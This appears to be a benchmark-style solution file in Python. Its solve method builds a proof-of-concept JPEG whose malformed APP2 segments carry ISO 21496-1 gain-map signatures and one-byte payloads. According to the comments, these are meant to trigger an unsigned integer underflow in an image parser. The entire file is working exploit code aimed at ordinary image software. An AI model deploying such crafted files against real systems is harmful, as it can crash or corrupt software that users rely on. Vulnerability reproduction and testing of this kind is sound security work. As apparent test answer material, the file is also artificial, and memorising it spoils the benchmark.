import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # JPEG Start of Image
        poc = b'\xFF\xD8'

        # Helper function to create an APP2 segment with a specific signature
        # and a truncated payload to trigger the integer underflow.
        def create_app2_segment(sig_str):
            # Signature typically needs to be null-terminated
            signature = sig_str.encode('ascii') + b'\x00'
            
            # The vulnerability is an unsigned subtraction underflow (size - header_size).
            # We provide a payload of 1 byte, which is likely smaller than the 
            # minimum header size expected by the parser (e.g., 4 or 8 bytes).
            payload = b'\x00'
            
            # Length includes the 2 bytes of the length field itself
            seg_length = 2 + len(signature) + len(payload)
            
            return b'\xFF\xE2' + struct.pack('>H', seg_length) + signature + payload

        # Add APP2 segments for common ISO 21496-1 signatures.
        # Adding both variants ensures we hit the target regardless of specific version string expectations.
        
        # Variant 1: "urn:iso:std:iso:ts:21496:-1" (Found in some implementations like libultrahdr)
        poc += create_app2_segment("urn:iso:std:iso:ts:21496:-1")
        
        # Variant 2: "urn:iso:std:iso:ts:21496:1" (Standard format)
        poc += create_app2_segment("urn:iso:std:iso:ts:21496:1")

        # JPEG End of Image
        poc += b'\xFF\xD9'

        return poc
